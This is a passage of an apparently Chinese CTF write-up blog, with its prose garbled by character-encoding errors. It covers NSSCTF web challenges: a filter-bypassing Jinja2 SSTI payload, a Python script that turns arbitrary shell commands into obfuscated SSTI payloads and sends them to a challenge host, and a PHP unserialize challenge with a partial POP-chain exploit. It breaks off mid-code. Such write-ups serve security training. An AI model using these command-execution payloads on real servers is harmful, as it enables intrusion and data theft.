<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> flg <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>fl<span class="token operator">=</span>aa<span class="token punctuation">,</span>ag<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># flag</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> ev <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ev<span class="token operator">=</span>aa<span class="token punctuation">,</span>al<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># eval</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> red <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>re<span class="token operator">=</span>aa<span class="token punctuation">,</span>ad<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># read</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> bul <span class="token operator">=</span> xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>but<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># __builtins__</span>

<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> ini <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ini<span class="token operator">=</span>aa<span class="token punctuation">,</span>t<span class="token operator">=</span>bb<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># init</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> glo <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>glo<span class="token operator">=</span>aa<span class="token punctuation">,</span>bals<span class="token operator">=</span>bb<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># globals</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> itm <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ite<span class="token operator">=</span>aa<span class="token punctuation">,</span>ms<span class="token operator">=</span>bb<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># items</span>

<span class="token comment"># å°†ä¸Šé¢æ„é€ çš„å­—ç¬¦æˆ–å­—ç¬¦ä¸²æ‹¼æ¥èµ·æ¥æ„é€ å‡º __import__('os').popen('cat /flag').read(): </span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> pld <span class="token operator">=</span> xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>imp<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>left<span class="token operator">~</span>yin<span class="token operator">~</span>so<span class="token operator">~</span>yin<span class="token operator">~</span>right<span class="token operator">~</span>point<span class="token operator">~</span>pon<span class="token operator">~</span>left<span class="token operator">~</span>yin<span class="token operator">~</span>ca<span class="token operator">~</span>space<span class="token operator">~</span>slas<span class="token operator">~</span>flg<span class="token operator">~</span>yin<span class="token operator">~</span>right<span class="token operator">~</span>point<span class="token operator">~</span>red<span class="token operator">~</span>left<span class="token operator">~</span>right <span class="token operator">%</span><span class="token punctuation">&#125;</span>

<span class="token comment"># ç„¶åå°†ä¸Šé¢æ„é€ çš„å„ç§å˜é‡æ·»åŠ åˆ°SSTIä¸‡èƒ½payloadé‡Œé¢å°±è¡Œäº†: </span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> f<span class="token punctuation">,</span>v <span class="token keyword">in</span> <span class="token punctuation">(</span>whoami<span class="token operator">|</span>attr<span class="token punctuation">(</span>xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>ini<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>glo<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>itm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># globals</span>
    <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> f <span class="token operator">==</span> bul <span class="token operator">%</span><span class="token punctuation">&#125;</span> 
        <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> a<span class="token punctuation">,</span>b <span class="token keyword">in</span> <span class="token punctuation">(</span>v<span class="token operator">|</span>attr<span class="token punctuation">(</span>itm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># builtins</span>
            <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> a <span class="token operator">==</span> ev <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># eval</span>
                <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>b<span class="token punctuation">(</span>pld<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token comment"># eval("__import__('os').popen('cat /flag').read()")</span>
                <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>è¿˜æœ‰ä¸€ä¸ªå¤§ä½¬å†™çš„è„šæœ¬</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">></span><span class="token keyword">from</span> typing <span class="token keyword">import</span> List

<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://node6.anna.nssctf.cn:28298/get_flag"</span><span class="token comment">#è®°å¾—æ”¹åœ°å€</span>

<span class="token keyword">def</span> <span class="token function">build_number</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
	result<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
	index<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span>
	<span class="token keyword">while</span> num <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
		n<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> num <span class="token operator">%</span> <span class="token number">10</span>
		result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>num2var<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">'*ten'</span><span class="token operator">*</span>index<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span>
		num <span class="token operator">//=</span> <span class="token number">10</span>
		index <span class="token operator">+=</span> <span class="token number">1</span>
	<span class="token keyword">return</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>


num2var_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
	<span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">"zero"</span><span class="token punctuation">,</span>
	<span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"one"</span><span class="token punctuation">,</span>
	<span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"two"</span><span class="token punctuation">,</span>
	<span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"three"</span><span class="token punctuation">,</span>
	<span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">"four"</span><span class="token punctuation">,</span>
	<span class="token number">5</span><span class="token punctuation">:</span> <span class="token string">"five"</span><span class="token punctuation">,</span>
	<span class="token number">6</span><span class="token punctuation">:</span> <span class="token string">"six"</span><span class="token punctuation">,</span>
	<span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">"seven"</span><span class="token punctuation">,</span>
	<span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">"eight"</span><span class="token punctuation">,</span>
	<span class="token number">9</span><span class="token punctuation">:</span> <span class="token string">"nine"</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">def</span> <span class="token function">num2var</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span>
		<span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"no way"</span><span class="token punctuation">)</span>
	<span class="token keyword">return</span> num2var_dict<span class="token punctuation">[</span>num<span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">build_payload</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
	<span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&#123;% set one=(a,)|length %&#125;
&#123;% set zero=one-one %&#125;
&#123;% set two=one+one %&#125;
&#123;% set three=one+two %&#125;
&#123;% set four=two*two %&#125;
&#123;% set five=three+two %&#125;
&#123;% set six=three*two %&#125;
&#123;% set seven=one+six %&#125;
&#123;% set eight=four*two %&#125;
&#123;% set nine=one+eight %&#125;
&#123;% set ten=five*two %&#125;
&#123;% set pops=dict(p=a,op=a)|join %&#125;
&#123;% set lo=(x|reject|string|list)|attr(pops)("""</span> <span class="token operator">+</span> build_number<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")%&#125;
&#123;% set init=(lo,lo,dict(ini=a,t=a)|join,lo,lo)|join %&#125;
&#123;% set cc=(lo,lo,dict(glo=a,bals=a)|join,lo,lo)|join %&#125;
&#123;% set ccc=(lo,lo,dict(get=a,item=a)|join,lo,lo)|join %&#125;
&#123;% set cccc=(lo,lo,dict(buil=a,tins=a)|join,lo,lo)|join %&#125;
&#123;% set evas=dict(ev=a,al=a)|join %&#125;
&#123;% set chs=dict(ch=a,r=a)|join %&#125;
&#123;% set chr=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(chs)%&#125;
&#123;% set eval=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(evas) %&#125;
&#123;% print(eval(("""</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>build_number<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string-interpolation"><span class="token string">f"__import__('os').popen('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').read()"</span></span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")|join)) %&#125;"""</span>


<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
	payload <span class="token operator">=</span> build_payload<span class="token punctuation">(</span>command<span class="token punctuation">)</span>
	response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
	<span class="token comment">#return re.findall(f"h3>(.*?)&lt;/h3", response.text, re.S)[0].strip()</span>

c <span class="token operator">=</span> <span class="token string">'cat /flag'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>run<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="æ³„éœ²çš„ä¼ªè£…"><a href="#æ³„éœ²çš„ä¼ªè£…" class="headerlink" title="æ³„éœ²çš„ä¼ªè£…"></a>æ³„éœ²çš„ä¼ªè£…</h3><p><img src="https://img-blog.csdnimg.cn/4da968b7349444ea8c30fc873afc897b.png" alt="2"><br>ä¸»ç•Œé¢ä¹Ÿæ²¡å•¥ï¼Œæ‰«ä¸€ä¸‹ç›®å½•ã€‚<br><img src="https://img-blog.csdnimg.cn/c3c7b6d968f244bc82946f267069f729.png" alt="2"><br>è®¿é—®test.txt<br><img src="https://img-blog.csdnimg.cn/70c0495b610441e1b57c98ffdc32e62a.png" alt="3"><br>çŸ¥é“æºç ä½†è¦æ‰¾åˆ°å¯¹åº”çš„phpæ–‡ä»¶ã€‚<br>è®¿é—®<a href="http://www.rarå¾—åˆ°è·¯å¾„/">www.rarå¾—åˆ°è·¯å¾„</a><br><img src="https://img-blog.csdnimg.cn/0fe65ed76dc94d7e8465f8d472870158.png" alt="6"><br>burpæŠ“åŒ…ä¼ªåè®®è¯»å–<br><img src="https://img-blog.csdnimg.cn/2dd20719f6054e4b8b4d753112d67505.png" alt="7"></p>
<h3 id="åæ–¹å‘çš„é’Ÿ"><a href="#åæ–¹å‘çš„é’Ÿ" class="headerlink" title="åæ–¹å‘çš„é’Ÿ"></a>åæ–¹å‘çš„é’Ÿ</h3><p>ååºåˆ—åŒ–</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// flag.php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">teacher</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$rank</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$salary</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$rank</span><span class="token punctuation">,</span><span class="token variable">$salary</span> <span class="token operator">=</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">=</span> <span class="token variable">$rank</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">salary</span> <span class="token operator">=</span> <span class="token variable">$salary</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">classroom</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$leader</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span> <span class="token operator">=</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hahaha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'one class'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'ing'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">!=</span><span class="token string single-quoted-string">'department'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">school</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$department</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$headmaster</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$department</span><span class="token punctuation">,</span><span class="token variable">$ceo</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span> <span class="token operator">=</span> <span class="token variable">$department</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">=</span> <span class="token variable">$ceo</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">IPO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ong'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Pretty Good ! Ctfer!\n"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span><span class="token operator">-></span><span class="token function">hahaha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">IPO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¯´å­˜åœ¨flag.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">classroom</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$leader</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span> <span class="token operator">=</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hahaha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'one class'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'ing'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">!=</span><span class="token string single-quoted-string">'department'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æˆç«‹æ¡ä»¶ï¼š<code>name=&quot;one class&quot;,leader=&quot;ing&quot;,rank=&quot;department&quot;</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">school</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$department</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$headmaster</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$department</span><span class="token punctuation">,</span><span class="token variable">$ceo</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span> <span class="token operator">=</span> <span class="token variable">$department</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">=</span> <span class="token variable">$ceo</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">IPO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ong'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Pretty Good ! Ctfer!\n"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æˆç«‹æ¡ä»¶ï¼š<code>headmaster=&quot;ong&quot;</code><strong>aä¼ å…¥ä¸€ä¸ªæ–¹æ³•ï¼Œbä¼ å…¥å‘½ä»¤</strong>ï¼Œphpå†…ç½®æ–¹æ³•<strong>SplFileObject</strong>å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œbä¼ å…¥ä¼ªåè®®è¯»å–flag.phpæ–‡ä»¶ã€‚<br>æ„é€ ä»£ç ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// flag.php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">teacher</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$rank</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span><span class="token string single-quoted-string">'ing'</span><span class="token punctuation">;</span>
